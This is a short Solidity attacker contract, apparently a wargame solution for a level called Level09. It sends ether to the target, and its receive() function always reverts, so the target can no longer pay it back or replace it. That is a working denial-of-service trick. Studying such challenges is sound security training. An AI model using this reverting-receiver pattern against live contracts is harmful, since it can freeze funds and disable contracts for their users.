// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Level09.sol';

contract Level09Attacker {

  Level09 level09;

  constructor(address payable _target) {
    level09 = Level09(_target);
  }

  function attack() external payable returns (bool) {
    (bool success, ) = payable(address(level09)).call{value: msg.value}("");
    require(success, 'Call failed, try increase the msg.value');
    return true;
  }

  receive() external payable {
    require(false, 'It will never work mouahaha');
  }
}